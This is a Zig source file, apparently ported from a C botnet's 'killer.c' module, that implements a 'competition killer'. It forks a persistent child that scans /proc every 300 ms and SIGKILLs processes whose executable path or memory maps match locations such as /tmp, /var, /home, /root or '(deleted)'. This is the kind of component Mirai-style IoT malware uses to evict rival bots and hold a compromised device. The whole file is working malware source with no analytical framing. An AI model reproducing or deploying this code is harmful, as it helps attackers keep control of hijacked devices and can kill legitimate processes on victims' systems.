//! # Competition Killer
//!
//! Scans /proc and kills competing bots/malware.
//!
//! ## C Reference: modules/system/killer/killer.c (232 lines)

const std = @import("std");
const posix = std.posix;
const fs = std.fs;

// ============================================================
// WHITELIST (from C: killer.c lines 29-77)
// ============================================================

const whitelisted = [_][]const u8{
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "usr/",
    "shell",
    "bin/",
    "boot/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "telnet",
    "ssh",
    "sshd",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
};

const blacklisted = [_][]const u8{
    "/tmp",
    "/var",
    "/mnt",
    "/boot",
    "/home",
    "/dev",
    "/.",
    "./",
    "/root",
    "(deleted)",
};

// ============================================================
// KILLER STATE
// ============================================================

var killer_pid: posix.pid_t = 0;
var stop_flag: bool = false;

// ============================================================
// KILLER INIT (from C: killer.c killer_init lines 206-231)
// ============================================================

pub fn init() void {
    const pid = posix.fork() catch return;

    if (pid > 0) {
        // Parent
        killer_pid = pid;
        return;
    }

    if (pid < 0) return; // Error

    // Child process
    // Set PR_SET_PDEATHSIG
    const PR_SET_PDEATHSIG = 1;
    _ = std.os.linux.prctl(PR_SET_PDEATHSIG, posix.SIG.HUP, 0, 0, 0);

    // Killer loop
    while (!stop_flag) {
        killerExe();
        killerMaps();
        std.Thread.sleep(300 * std.time.ns_per_ms); // 300ms
    }

    posix.exit(0);
}

pub fn kill() void {
    stop_flag = true;
}

// ============================================================
// KILLER EXE (from C: killer.c killer_exe lines 102-148)
// ============================================================

fn killerExe() void {
    var dir = fs.openDirAbsolute("/proc", .{ .iterate = true }) catch return;
    defer dir.close();

    const current_pid = std.os.linux.getpid();
    const ppid = std.os.linux.getppid();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind != .directory) continue;

        // Check if name is numeric (PID)
        const pid = std.fmt.parseInt(posix.pid_t, entry.name, 10) catch continue;

        if (pid <= 1 or pid == current_pid or pid == killer_pid or pid == ppid) continue;

        // Read /proc/{pid}/exe
        var path_buf: [256]u8 = undefined;
        const path = std.fmt.bufPrint(&path_buf, "/proc/{d}/exe", .{pid}) catch continue;

        var link_buf: [256]u8 = undefined;
        const link = posix.readlink(path, &link_buf) catch continue;

        // Check whitelist
        if (isWhitelisted(link)) continue;

        // Check blacklist
        for (blacklisted) |bl| {
            if (std.mem.indexOf(u8, link, bl) != null) {
                _ = std.os.linux.kill(pid, posix.SIG.KILL);
                break;
            }
        }
    }
}

// ============================================================
// KILLER MAPS (from C: killer.c killer_maps lines 150-200)
// ============================================================

fn killerMaps() void {
    var dir = fs.openDirAbsolute("/proc", .{ .iterate = true }) catch return;
    defer dir.close();

    const current_pid = std.os.linux.getpid();
    const ppid = std.os.linux.getppid();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind != .directory) continue;

        const pid = std.fmt.parseInt(posix.pid_t, entry.name, 10) catch continue;

        if (pid <= 1 or pid == current_pid or pid == killer_pid or pid == ppid) continue;

        // Open /proc/{pid}/maps
        var path_buf: [256]u8 = undefined;
        const path = std.fmt.bufPrint(&path_buf, "/proc/{d}/maps", .{pid}) catch continue;

        var file = fs.openFileAbsolute(path, .{}) catch continue;
        defer file.close();

        var buf: [4096]u8 = undefined;
        var killed = false;

        while (!killed) {
            const bytes_read = file.read(&buf) catch break;
            if (bytes_read == 0) break;

            const content = buf[0..bytes_read];

            if (isWhitelisted(content)) continue;

            for (blacklisted) |bl| {
                if (std.mem.indexOf(u8, content, bl) != null) {
                    _ = std.os.linux.kill(pid, posix.SIG.KILL);
                    killed = true;
                    break;
                }
            }
        }
    }
}

// ============================================================
// HELPER
// ============================================================

fn isWhitelisted(path: []const u8) bool {
    for (whitelisted) |wl| {
        if (std.mem.indexOf(u8, path, wl) != null) return true;
    }
    return false;
}
